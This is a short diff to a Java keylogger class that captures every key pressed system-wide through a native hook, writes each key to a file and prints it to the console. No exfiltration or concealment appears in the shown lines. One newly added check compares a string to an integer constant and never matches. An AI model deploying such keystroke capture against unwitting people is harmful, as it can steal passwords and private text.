@@ -56,10 +56,15 @@ public class KeyLog implements NativeKeyListener{
 
 	@Override
 	public void nativeKeyPressed(NativeKeyEvent arg0) {
-		char keyPressed = (char)arg0.getRawCode();
+		
+		String keyPressed = NativeKeyEvent.getKeyText(arg0.getKeyCode());
 		
 			try {
+				if(keyPressed.length()>1 || keyPressed.equals(NativeKeyEvent.VC_ENTER)) {
+					keyPressed=keyPressed+"\n";
+				}
 				fileOutStream.write(keyPressed);
+				System.out.println(keyPressed);
 				fileOutStream.flush();
 			} catch (IOException e) {
 				String errMsg = Arrays.toString(e.getStackTrace());
@@ -84,8 +89,8 @@ public class KeyLog implements NativeKeyListener{
 
 	@Override
 	public void nativeKeyTyped(NativeKeyEvent arg0) {
-//		String keyPressed = NativeKeyEvent.getKeyText(arg0.getKeyCode());
-//		if (keyPressed.length()==1) {
+//		char keyPressed = arg0.getKeyChar();
+//		
 //			try {
 //				fileOutStream.write(keyPressed);
 //				fileOutStream.flush();
@@ -93,7 +98,6 @@ public class KeyLog implements NativeKeyListener{
 //				String errMsg = Arrays.toString(e.getStackTrace());
 //				System.out.println(errMsg);
 //			} 
-//		}
 	}
 
 	public File getOutput() {
